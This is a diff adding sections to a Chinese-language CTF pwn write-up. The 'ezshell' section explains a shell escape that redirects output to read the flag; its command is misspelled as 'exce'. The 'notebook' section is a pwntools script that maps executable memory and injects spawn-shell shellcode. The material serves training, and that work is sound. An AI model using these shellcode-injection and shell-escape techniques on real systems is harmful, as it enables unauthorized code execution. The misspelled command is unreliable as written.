@@ -71,3 +71,29 @@ p.interactive()
 我们输入的参数是8，所以填充10个参数，那么应该是`10*8=80=0x50`,一共填充0x50个数据，可以到达第18个参数
 
 接下来就会将这些参数依次写入`magic`的地址里，就可以修改`magic`的指了
+
+## ezshell
+
+主要考察linux命令行
+
+运行程序之后发现构造了shell，但是不允许`cat flag`指令，并且输出不被允许
+
+但是我们可以发现有一个指令叫`showKey`，那么我们可以输入`sh`，这样就可以获得shell，然后在输入`exce 1>&0`将标准输出改为标准输入，以此`cat flag`
+
+## notebook
+
+菜单题，主要是考察mmap函数，将需要的东西输入好，直接写入shellcode就行
+
+```python
+from pwn import *
+context.arch  = 'amd64'
+p = process('./pwn')
+p.sendlineafter('exit',b'1')
+p.sendlineafter('id',b'1')
+p.sendlineafter('addr: ',str(0x1337000))
+p.sendlineafter('length: ',str(0x100))
+p.sendlineafter('mode: ',str(7))
+p.sendafter('note: ',asm(shellcraft.sh()).ljust(0x100,b'a'))
+p.interactive()
+```
+
